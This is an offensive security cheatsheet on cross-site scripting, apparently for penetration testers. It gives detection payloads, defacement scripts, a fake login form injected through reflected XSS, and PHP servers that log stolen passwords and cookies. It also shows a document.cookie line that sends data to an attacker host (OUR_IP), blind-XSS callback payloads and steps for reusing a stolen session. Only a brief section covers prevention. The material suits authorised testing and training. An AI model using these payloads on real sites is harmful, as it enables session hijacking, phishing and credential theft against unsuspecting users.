---
title: "Cross-Site Scripting (XSS)"
description: "Reflected, stored, DOM XSS, payloads, and filter bypasses."
sidebar:
  order: 5
  label: "Cross-Site Scripting (XSS)"
---
> XSS injects JavaScript into the client via unsanitized input. Types: Stored (persistent), Reflected (non-persistent via URL), and DOM-based (client-side only). Impact: session theft, phishing, defacing.

---


## Types of XSS

| Type | Persistent | Where | How to Attack |
|------|-------------|-------|-------------|
| **Stored** | ✅ Yes | DB → all users | Inject in form/comment → payload visible to any visitor |
| **Reflected** | ❌ No | Back-end → immediate response | Send URL with payload to the target |
| **DOM-based** | ❌ No | Client-side JS only | URL with `#` or parameter read by vulnerable JS (`innerHTML`, `document.write`) |

---

## Detection Payloads

```html
<!-- Basic — works in most contexts -->
<script>alert(window.origin)</script>
<script>alert(1)</script>
<script>print()</script>

<!-- Without <script> — for innerHTML and DOM XSS -->
<img src="" onerror=alert(window.origin)>
<img src=x onerror=alert(1)>

<!-- Visual verification without JS -->
<plaintext>

<!-- Alternatives with event handlers -->
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>1</option></select>
<video src=x onerror=alert(1)>

<!-- Attribute break out -->
'><script>alert(1)</script>
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

> **Tip:** `window.origin` shows the URL of the iframe/domain executing the payload — useful to confirm the execution context.

---

## DOM XSS — Sources and Sinks

### Sources (Input to the DOM)

```javascript
document.URL
document.location
document.referrer
location.hash          // #... fragment of the URL
window.name
// + any input field read with .value
```

### Dangerous Sinks (Write HTML Unsanitized)

```javascript
// Native JavaScript
element.innerHTML = userInput    // Does NOT allow <script> but does allow <img onerror=>
element.outerHTML = userInput
document.write(userInput)
document.writeln(userInput)

// jQuery
$('#el').html(userInput)
$('#el').append(userInput)
$('#el').after(userInput)
$('#el').before(userInput)
$('#el').prepend(userInput)
$('#el').replaceWith(userInput)
```

> **Rule:** if `innerHTML` receives user input → use `<img onerror=...>` instead of `<script>`, because innerHTML blocks `<script>`.

---

## Defacing (Stored XSS)

```javascript
// Change background
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://evil.com/bg.jpg"</script>

// Change page title
<script>document.title = 'Hacked'</script>

// Replace the entire body content
<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Hacked</h1>'</script>

// With jQuery (if available)
<script>$('body').html('<center><h1>Hacked</h1></center>')</script>
```

---

## Phishing — Login Form Injection (Reflected XSS)

### Step 1 — Injecting a Fake Form

```javascript
// Complete payload: write form + delete the legitimate form + comment out the rest
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
// Sends <!-- at the end of the URL to comment out residual HTML
```

### Attack URL (Reflected)

```
http://target/page?param='><script>PAYLOAD</script><!--
```

### Step 2 — Capturing Credentials (Quick Netcat)

```bash
sudo nc -lvnp 80
# GET /?username=admin&password=pass123 HTTP/1.1
```

### Step 3 — PHP Server for Silent Redirect (More Credible)

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
```

```php
<?php
// index.php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET_IP/original_page.php");
    fclose($file);
    exit();
}
?>
```

```bash
sudo php -S 0.0.0.0:80
cat creds.txt    # view captured credentials
```

---

## Session Hijacking — Cookie Stealing

### Script in OUR_IP — script.js

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

### PHP Cookie Logger — index.php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### XSS Payload to Load the Script

```bash
# Start PHP server
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# create script.js and index.php
sudo php -S 0.0.0.0:80
```

```html
<!-- Payload in the vulnerable field -->
<script src=http://OUR_IP/script.js></script>
```

```bash
# Verify captured cookies
cat cookies.txt
# Victim IP: 10.10.10.1 | Cookie: session=f904f93c949d19d870911bf8b05fe7b2
```

### Using the Stolen Cookie in Firefox

```
Shift+F9 -> Storage -> + -> add Name=session, Value=f904f93c...
-> Refresh -> access as victim
```

---

## Blind XSS — Identifying the Vulnerable Field

```html
<!-- Identify which field executes XSS (without seeing the response directly) -->
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
<script src=http://OUR_IP/email></script>
<script src=http://OUR_IP/website></script>

<!-- Variations for different injection contexts -->
'><script src=http://OUR_IP/field></script>
"><script src=http://OUR_IP/field></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>$.getScript("http://OUR_IP/field")</script>
```

```bash
# Server listening — see which field makes callback
sudo php -S 0.0.0.0:80
# 10.10.10.1 [200]: /username → username is the vulnerable field
```

> **Fields to prioritize:** name, username, website — skip email (validated) and password (hashed).

---

## Automated Tools

```bash
# XSStrike — XSS fuzzer
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip install -r requirements.txt
python xsstrike.py -u "http://target/page?param=test"

# Burp Pro Scanner / ZAP Active Scan -> also detect XSS automatically
# See cheatsheet [Using Web Proxies](/en/metodologias/web/using-web-proxies/) for configuration

# Manual payload wordlists
# https://github.com/swisskyrepo/PayloadsAllTheThings (XSS Injection)
# https://github.com/payload-box/xss-payload-list
```

---

## Prevention (for reporting / hardening)

```javascript
// Frontend — sanitize with DOMPurify
import DOMPurify from 'dompurify';
let clean = DOMPurify.sanitize(userInput);

// Avoid dangerous sinks with user input:
// ❌ element.innerHTML = userInput
// ✅ element.textContent = userInput
```

```php
// Backend PHP — output encoding
htmlentities($_GET['input']);      // encode all HTML entities
htmlspecialchars($_GET['input']); // encode < > " ' &

// Backend PHP — validation
filter_var($_GET['email'], FILTER_VALIDATE_EMAIL);
```

---

## Pitfalls / Gotchas

- **`innerHTML` blocks `<script>`:** use `<img onerror=...>` or `<svg onload=...>` in DOM contexts.
- **Reflected XSS via GET:** the full URL with the payload can be shared. Verify if the parameter is GET or POST before crafting the attack.
- **`#` in DOM XSS:** the URL fragment (`#`) never reaches the server. If you see `#task=FUZZ` in the URL, it is DOM XSS.
- **Blind XSS without callback:** if no payload calls the server, try variations like `'><script src=...>` or `"><script src=...>` to escape the attribute context.
- **PHP server vs netcat:** netcat captures a single connection and does not return an HTTP response. Use PHP for multi-victim and silent redirect.
- **HttpOnly Cookie:** if the cookie has `HttpOnly`, `document.cookie` returns empty. Session hijacking will not work directly; consider keylogging or stealing the CSRF token.
- **Active CSP:** Content Security Policy can block external `<script src=http://...>`. Verify response headers. Inline payloads might be needed if allowed by the CSP.
- **iframe with a different domain:** `window.origin` will show the domain of the iframe, not the parent. Confirm which domain is vulnerable.
- **`alert()` blocked:** some modern browsers block alert in cross-origin iframes. Use `print()` or `confirm()` as an alternative.
- **XSStrike false positives:** always manually verify the payload reported by the tool.

---

## Related Cheatsheets

- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting requests to craft and test XSS payloads
- [File Inclusion](/en/metodologias/web/file-inclusion/) — stored XSS can be used to extract tokens from LFI pages
- [Web Attacks](/en/metodologias/web/web-attacks/) — CSRF, session management, JWT — complements session hijacking
- [Attacking Common Applications](/en/metodologias/web/attacking-common-applications/) — XSS in CMS (WordPress, Joomla) and admin panels
